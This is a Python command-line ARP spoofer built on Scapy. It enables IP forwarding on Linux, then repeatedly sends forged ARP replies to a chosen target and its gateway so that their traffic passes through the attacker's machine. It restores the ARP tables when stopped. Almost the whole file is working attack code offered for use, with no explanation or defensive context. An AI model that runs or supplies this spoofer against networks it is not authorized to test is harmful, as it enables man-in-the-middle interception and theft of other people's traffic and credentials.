from scapy.all import *
from scapy.layers.l2 import ARP, Ether
import argparse


def enable_ip_route():
  #this is for enable ip routing in linux 
    file_path = '/proc/sys/net/ipv4/ip_forward'
    with open(file_path, 'w+') as file:
        if file.read == 1:
            pass
        else:
            file.write('1')
          
def get_mac(ip):
    answered, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), verbose=0)
    if answered:
        return answered[0][1].src

def spoofing(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_response, verbose=0)
    self_mac = ARP().hwsrc
    print(f"[+] sent to {target_ip} : {host_ip} is-it {self_mac}" )

def restore_defaults(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    send(arp_response, verbose=0, count=5)

parser = argparse.ArgumentParser("ARP Spoofer using Scapy")
parser.add_argument("-t", "--target", help="Specify target IP", required=True)
parser.add_argument("-g", "--gateway", help="Specify Gateway IP", required=True)
args = parser.parse_args()

#arg parsing
target = args.target
gateway = args.gateway

print("*" * 50)
print("Python ARP Spoofer")
print("*" * 50)
print("Target\t\t{}\ngateway\t\t{}\n".format(target, gateway))
try:
    while True:
        spoofing(gateway, target)
        spoofing(target, gateway)
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[!] Process stopped. Restoring defaults .. please hold")
    restore_defaults(gateway, target)
    restore_defaults(target, gateway)
    exit(0)
